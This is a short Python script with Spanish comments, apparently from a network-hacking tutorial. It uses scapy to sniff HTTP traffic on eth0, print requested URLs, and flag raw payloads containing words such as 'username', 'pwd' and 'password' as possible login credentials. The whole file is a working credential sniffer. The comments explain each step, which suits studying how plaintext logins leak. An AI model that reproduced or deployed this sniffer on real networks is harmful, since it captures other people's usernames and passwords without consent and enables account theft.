#!/etc/bin/env python
import scapy.all as scapy
# module that needs to instal pip3 install scapy_http
from scapy.layers import http

def sniff(interface):
    # iface interface a snifear, store es donde guardar los packetes en memoria
    # prn especifica una callback function es decir ejecutar una funcion cada que e mande el paquete
    # Al filter le podemos asignar arp, tcp, udp para obtener la informacion relacionada con ese protocolo
    # Incluso podemos asignar un puerto al filter port 80 -> Web services
    # filter= "port 80" ejemplo, "udp" -> sirve para los msg que tienen video, audio
    scapy.sniff(iface=interface, store=False, prn=procces_sniffed_packet)
def get_url(packet):
    return  packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        # Si el packete contiene el layer Raw que es donde en http incluye info de logins
        # imprimira lo relacionado con packet["scapy."layer""].field donde el campo deseado
        # se puede obtener con packet.show()
        load = packet[scapy.Raw].load

        keywords = ["username", "usr", "pwd", "password", "pass"]
        for keyword in keywords:
            if keyword in str(load):
                return load



def procces_sniffed_packet(packet):
    # SI el paquete tiene una capa (metodo implementado por scapy
    # de tipo que revisa si tiene una capa)  http request imprimira el mensaje.
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url = get_url(packet)
        print("[+] HTTP Request ->  " + str(url))
        login_info = get_login_info(packet)
        if login_info:
            print("[+] Posible usuario/contraseña" + str(login_info) + "\n\n")

sniff("eth0")
